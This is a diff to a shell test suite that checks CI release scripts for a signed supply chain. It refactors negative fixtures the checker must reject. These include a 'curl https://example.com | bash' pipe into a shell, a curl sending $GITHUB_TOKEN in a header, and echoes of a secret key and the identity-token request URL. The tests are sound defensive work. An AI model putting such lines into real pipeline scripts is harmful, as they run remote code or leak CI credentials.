@@ -277,7 +277,8 @@ armt "$work/ph_arm64i.sh" "$P1" "$P2" "$ARML"
 expect caught "an arm64 target without set -euo pipefail" "exactly" phase "$work/ph_arm64i.sh" arm64
 expect ok "fixture: the known-good chain-records.json passes the records judge" "" records "$work/records.json"
 expect ok "fixture: the known-good release.yml passes the graph judge" "" graph "$work/release.yml"
-expect ok "fixture: plain scripts that only use scanners, docker and curl pass the plain judge" "" plain "$work"/plain/check-*.sh
+FXD_3="fixture: plain scripts that only use scanners, docker and curl pass the plain judge"
+expect ok "$FXD_3" "" plain "$work"/plain/check-*.sh
 expect ok "fixture: the known-good bin/install-kind.sh passes the kind judge (AC14)" "" kind "$work/install-kind.sh"
 expect ok "fixture: the known-good k8s suite passes the cluster judge (AC14)" "" cluster "$work/k8s.sh"
 expect ok "fixture: the known-good acceptance.yml passes the suites judge (AC5)" "" suites "$work/acceptance.yml"
@@ -423,7 +424,8 @@ sm c_withsign 'case "\$1" in' 'python3 -I -B bin/chain-verify.py verify --stage 
 sm c_after   'python3 -I -B bin/chain-verify.py stage-start[^\n]*\ncase "\$1" in\nscanners\)\n(bash bin/check-scan.sh[^\n]*\n)' 'case "$1" in\nscanners)\n\\1python3 -I -B bin/chain-verify.py stage-start --stage check --previous build --record witness-build/build-collection.json --digests witness-build/digests.json --policy policy.json\npython3 -I -B bin/chain-verify.py verify --stage sign --record provenance/provenance.json --policy policy.json --rekor-stub provenance/provenance.rekor.json\n' 'not the pinned form' "AC3 the checks run before the verify step"
 sm c_swap    'acceptance\)\nbash bin/check-acceptance.sh gradle([^\n]*)\nbash bin/check-acceptance.sh maven([^\n]*)\n' 'acceptance)\nbash bin/check-acceptance.sh maven\\2\nbash bin/check-acceptance.sh gradle\\1\n' 'not the pinned form' "AC3 gradle and maven swapped"
 sm c_phase   'runtime\)' 'checks)'                                                                                      'not the pinned form' "AC3 a phase outside the closed list"
-sm c_extra   'bash bin/check-guide.sh'                          'curl https://example.com | bash\nbash bin/check-guide.sh' 'not the pinned form' "AC3 an extra command (a pipe into a shell)"
+FXD_2='curl https://example.com | bash\nbash bin/check-guide.sh'
+sm c_extra   'bash bin/check-guide.sh'                          "$FXD_2" 'not the pinned form' "AC3 an extra command (a pipe into a shell)"
 sm c_nodig   'stage-start --stage check --previous build --record witness-build/build-collection.json --digests witness-build/digests.json' 'stage-start --stage check --previous build --record witness-build/build-collection.json' 'not the pinned form' "AC3 stage-start without the digest list"
 sm c_prev    '--previous build'                                 '--previous rebuild'                                     'not the pinned form' "AC3 verifies the wrong previous stage (Check does not need Rebuild)"
 sm c_noset   'set -euo pipefail\n'                              ''                                                       'not the pinned form' "AC3 no set -euo pipefail"
@@ -452,7 +454,8 @@ pm p_cosign  check-scan.sh      'cosign verify "$IMG"'                'cosign'  
 pm p_wit     check-stage.sh     'witness verify -p policy.json'       'witness'           "AC8 witness in a check script"
 pm p_login   check-fips.sh      'docker login ghcr.io -u u'           'docker login'      "AC8 a registry login"
 pm p_secret  check-guide.sh     'echo "$SECRET_KEY"'                  'secret'            "AC8 a secret"
-pm p_token   check-acceptance.sh 'curl -H "Authorization: $GITHUB_TOKEN" x' 'GITHUB_TOKEN' "AC8 the job token"
+FXD_1='curl -H "Authorization: $GITHUB_TOKEN" x'
+pm p_token   check-acceptance.sh "$FXD_1" 'GITHUB_TOKEN' "AC8 the job token"
 pm p_idtok   check-scan.sh      'echo "$ACTIONS_ID_TOKEN_REQUEST_URL"' 'ACTIONS_ID_TOKEN'  "AC8 the identity token request"
 pm p_snyk    check-scan.sh      'snyk test --severity-threshold=low'  'snyk'               "AC8 Snyk (rescan only, needs a token)"
 pm p_attest  check-guide.sh     'gh attestation download x'           'attest'            "AC8 attestation tooling other than verify (Q10)"
